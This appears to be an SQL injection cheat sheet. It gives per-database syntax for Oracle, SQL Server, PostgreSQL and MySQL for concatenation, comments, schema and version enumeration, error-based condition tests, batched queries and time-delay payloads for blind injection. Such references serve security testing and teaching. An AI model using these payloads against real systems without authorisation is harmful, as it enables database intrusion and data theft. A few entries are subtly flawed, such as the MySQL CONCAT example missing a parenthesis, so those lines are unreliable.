Different database types often have different syntaxes.

# String concatenation
String concatenation is the process of combining multiple strings to make a single string. It is useful for extracting multiple columns in one column slot.
- Oracle: `'abc'||'xyz'`
- Microsoft: `'abc'+'xyz'`
- PostgreSQL: `'abc'||'xyz'`
- MySQL: `'abc' 'xyz'` or `CONCAT('abc','xyz'`

# Substrings
Getting a substring means extracting a smaller portion of a string. It can be useful for letter-by-letter examination. The following substrings extract the value `de` from `abcdef`.
- Oracle: `SUBSTR('abcdef', 4, 2)`
- Microsoft: `SUBSTRING('abcdef', 4, 2)`
- PostgreSQL: `SUBSTR('abcdef', 4, 2)` or `SUBSTRING('abcdef', 4, 2)`
- MySQL: `SUBSTRING('abcdef', 4, 2)`

# Comments
Comments can be used to ignore the remainder of a query.
- Oracle: `--comment` or `/*comment*/`
- Microsoft: `--comment` or `/*comment*/`
- PostgreSQL: `--comment` or `/*comment*/`
- MySQL: `-- comment`, `#comment`, or `/*comment*/`

# Getting the database version
- Oracle: `SELECT banner FROM v$version` or `SELECT version FROM v$instance`
- Microsoft: `SELECT @@version`
- PostgreSQL: `SELECT version()`
- MySQL: `SELECT @@version`

# Getting table names
- Oracle: `SELECT * FROM all_tables`
- Microsoft: `SELECT * FROM information_schema.tables`
- PostgreSQL: `SELECT * FROM information_schema.tables`
- MySQL: `SELECT * FROM information_schema.tables`

# Getting column names
- Oracle: `SELECT * FROM all_tab_columns WHERE table_name = '<table name>'`
- Microsoft: `SELECT * FROM information_schema.columns WHERE table_name = '<table name>'`
- PostgreSQL: `SELECT * FROM information_schema.columns WHERE table_name = '<table name>'`
- MySQL: `SELECT * FROM information_schema.columns WHERE table_name = '<table name>'`

# Testing conditions
Testing conditions can be used to see if something is true, such as if a certain table exists. There are many ways to do this, and these are just one example.
- Oracle: `SELECT CASE WHEN (<condition>) THEN TO_CHAR(1/0) ELSE NULL END FROM dual`
- Microsoft: `SELECT CASE WHEN (<condition>) THEN 1.0 ELSE NULL END`
- PostgreSQL: `1 = (SELECT CASE WHEN (condition) THEN CAST(1/0 AS INTEGER) ELSE NULL END)`
- MySQL: `SELECT IF(condition, (SELECT table_name FROM information_schema.tables),'a')`

# Batched queries
A way to run multiple queries in one command line.
- Oracle: Not supported
- Microsoft: `Query 1; Query 2`
- PostgreSQL: `Query 1; Query 2`
- MySQL: `Query 1; Query 2`

# Time delays
Time delays are useful for blind SQL injection. Here are some ways to cause 10 second time delays:
- Oracle: `dbms_pipe.receive_message(('a'),10)`
- Microsoft: `WAITFOR DELAY '0:0:10'`
- PostgreSQL: `SELECT pg_sleep(10)`
- MySQL: `SELECT SLEEP(10)`

# Conditional time delays
Used for checking conditions in blind SQL injection.
- Oracle: `SELECT CASE WHEN (<condition>) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual`
- Microsoft: `IF (<condition>) WAITFOR DELAY '0:0:10'`
- PostgreSQL: `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END`
- MySQL: `SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')`